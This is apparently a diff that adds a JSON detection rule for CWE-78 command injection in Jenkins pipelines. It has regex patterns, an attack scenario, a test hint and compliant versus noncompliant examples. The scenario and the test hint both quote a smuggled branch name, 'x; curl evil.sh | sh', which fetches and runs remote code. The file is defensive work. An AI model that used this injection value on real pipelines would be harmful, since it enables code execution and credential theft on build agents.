@@ -1,0 +1,36 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "Jenkins sh/bat step with Groovy string interpolation of untrusted params/env",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "jenkinsfile",
+    "jenkins pipeline",
+    "sh step",
+    "bat step",
+    "shell step",
+    "groovy pipeline",
+    "ci pipeline"
+  ],
+  "patterns": [
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "(?im)\\b(?:sh|bat|powershell)\\b[^\"\\n=]*\"[^\"\\n]*\\$\\{(?:params|env)\\.[A-Za-z_]"
+    },
+    {
+      "lang": "java",
+      "confidence": "high",
+      "re": "(?im)\\b(?:sh|bat|powershell)\\b[^\"\\n=]*\"[^\"\\n]*\\$\\{env\\.(?:BRANCH_NAME|CHANGE_TITLE|CHANGE_AUTHOR|CHANGE_BRANCH|CHANGE_TARGET|GIT_BRANCH|TAG_NAME)\\b"
+    }
+  ],
+  "attack_scenario": "an attacker opens a PR whose branch is named `x; curl evil.sh | sh` or sets a build parameter to a shell metacharacter payload; because Groovy concatenates it into the double-quoted sh string, the injected command executes on the Jenkins agent with the agent's credentials",
+  "negative_test_hint": [
+    "trigger the pipeline with a branch named \"x; curl evil.sh | sh\" and assert the injected command never executes on the agent"
+  ],
+  "exemplar": {
+    "noncompliant": "sh \"kubectl set image deploy/app app=${params.IMAGE}\"",
+    "compliant": "withEnv([\"IMAGE=${params.IMAGE}\"]) { sh 'kubectl set image deploy/app app=\"$IMAGE\"' }",
+    "explanation": "A Groovy double-quoted (GString) argument to sh/bat is interpolated by Groovy BEFORE the shell runs, so a build parameter or tainted env var (PR branch/title, git branch, tag) is spliced directly into the command line. Jenkins docs explicitly say to pass such values through env and single-quote the sh body so the shell, not Groovy, expands them and metacharacters in the value stay inert data."
+  }
+}
